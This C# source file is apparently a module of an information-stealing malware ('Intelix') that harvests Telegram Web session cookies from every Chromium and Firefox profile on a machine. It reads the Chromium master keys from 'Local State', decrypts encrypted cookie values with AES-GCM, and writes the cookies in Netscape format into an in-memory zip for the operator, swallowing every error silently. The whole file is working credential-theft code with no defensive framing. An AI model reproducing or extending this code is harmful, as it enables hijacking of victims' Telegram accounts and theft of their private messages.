using System;
using System.Collections.Concurrent;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using Intelix.Helper.Sql;

namespace Intelix.Targets.Messangers
{
    // Collects Telegram Web cookies from all Chromium and Firefox browsers
    // Column layout mirrors exactly what Chromium.cs uses in its Cookies() method
    public class TelegramWeb : ITarget
    {
        private static readonly string[] TelegramDomains = {
            "web.telegram.org",
            ".web.telegram.org",
            "telegram.org",
            ".telegram.org",
            "webk.telegram.org",
            "webz.telegram.org"
        };

        private static bool IsTelegramDomain(string host)
        {
            if (string.IsNullOrEmpty(host)) return false;
            foreach (string d in TelegramDomains)
                if (host.Equals(d, StringComparison.OrdinalIgnoreCase) ||
                    host.EndsWith(d, StringComparison.OrdinalIgnoreCase))
                    return true;
            return false;
        }

        public void Collect(InMemoryZip zip, Counter counter)
        {
            var lines = new ConcurrentBag<string>();

            // ── Chromium ──────────────────────────────────────────────────────────
            Parallel.ForEach(Paths.Chromium, browser =>
            {
                if (!Directory.Exists(browser)) return;
                try
                {
                    string localState = Path.Combine(browser, "Local State");
                    byte[] masterv10 = LocalState.MasterKeyV10(localState);
                    byte[] masterv20 = LocalState.MasterKeyV20(localState);
                    if (masterv10 == null && masterv20 == null) return;

                    Parallel.ForEach(Directory.GetDirectories(browser), profile =>
                    {
                        string[] cookiePaths = {
                            Path.Combine(profile, "Network", "Cookies"),
                            Path.Combine(profile, "Cookies")
                        };
                        foreach (string cookiePath in cookiePaths)
                        {
                            if (!File.Exists(cookiePath)) continue;
                            try
                            {
                                // Exactly as Chromium.cs: read bytes, create SqLite, ReadTable
                                byte[] dbBytes = File.ReadAllBytes(cookiePath);
                                SqLite db = new SqLite(dbBytes);
                                db.ReadTable("cookies");

                                // Chromium.cs Cookies() column mapping:
                                // col 5 = encrypted_value (blob as string via Encoding.Default)
                                // col 4 = value (plain text, non-empty for old unencrypted cookies)
                                // col 1 = host_key
                                // col 3 = name
                                // col 6 = path
                                // col 7 = expires_utc
                                for (int i = 0; i < db.GetRowCount(); i++)
                                {
                                    try
                                    {
                                        string host    = db.GetValue(i, 1);
                                        if (!IsTelegramDomain(host)) continue;

                                        string plainVal = db.GetValue(i, 4); // value column (plain)
                                        string name     = db.GetValue(i, 3);
                                        string path2    = db.GetValue(i, 6);
                                        string expires  = db.GetValue(i, 7);

                                        string cookieValue = plainVal;

                                        // If plain value is empty — decrypt the blob (col 5)
                                        if (string.IsNullOrEmpty(plainVal))
                                        {
                                            byte[] enc = Encoding.Default.GetBytes(db.GetValue(i, 5));
                                            byte[] dec = AesGcm.DecryptBrowser(enc, masterv10, masterv20, true);
                                            if (dec != null && dec.Length > 0)
                                                cookieValue = Encoding.UTF8.GetString(dec);
                                        }

                                        if (string.IsNullOrEmpty(cookieValue)) continue;

                                        lines.Add(string.Concat(new string[] {
                                            host, "\tTRUE\t", path2 ?? "/", "\tFALSE\t",
                                            expires ?? "0", "\t", name, "\t", cookieValue, "\n"
                                        }));
                                    }
                                    catch { }
                                }
                                break;
                            }
                            catch { }
                        }
                    });
                }
                catch { }
            });

            // ── Firefox / Gecko ───────────────────────────────────────────────────
            Parallel.ForEach(Paths.Gecko, profilesRoot =>
            {
                if (!Directory.Exists(profilesRoot)) return;
                try
                {
                    Parallel.ForEach(Directory.GetDirectories(profilesRoot), profile =>
                    {
                        string cookiePath = Path.Combine(profile, "cookies.sqlite");
                        if (!File.Exists(cookiePath)) return;
                        try
                        {
                            SqLite db = SqLite.ReadTable(cookiePath, "moz_cookies");
                            if (db == null) return;

                            // moz_cookies schema:
                            // 0=id, 1=baseDomain, 2=originAttributes, 3=name, 4=value,
                            // 5=host, 6=path, 7=expiry, 8=lastAccessed, 9=creationTime,
                            // 10=isSecure, 11=isHttpOnly, 12=appId, 13=inBrowserElement, 14=sameSite
                            for (int i = 0; i < db.GetRowCount(); i++)
                            {
                                try
                                {
                                    string host  = db.GetValue(i, 5);
                                    if (!IsTelegramDomain(host)) continue;

                                    string name    = db.GetValue(i, 3);
                                    string value   = db.GetValue(i, 4);
                                    string path2   = db.GetValue(i, 6);
                                    string expires = db.GetValue(i, 7);

                                    if (string.IsNullOrEmpty(value)) continue;

                                    lines.Add(string.Concat(new string[] {
                                        host, "\tTRUE\t", path2 ?? "/", "\tFALSE\t",
                                        expires ?? "0", "\t", name, "\t", value, "\n"
                                    }));
                                }
                                catch { }
                            }
                        }
                        catch { }
                    });
                }
                catch { }
            });

            if (lines.Count > 0)
            {
                zip.AddTextFile("Messangers\\TelegramWeb\\cookies.txt", string.Concat(lines));
                var entry = new Counter.CounterApplications { Name = "Telegram Web" };
                entry.Files.Add("Messangers\\TelegramWeb\\cookies.txt (" + lines.Count + " cookies)");
                counter.Messangers.Add(entry);
            }
        }
    }
}
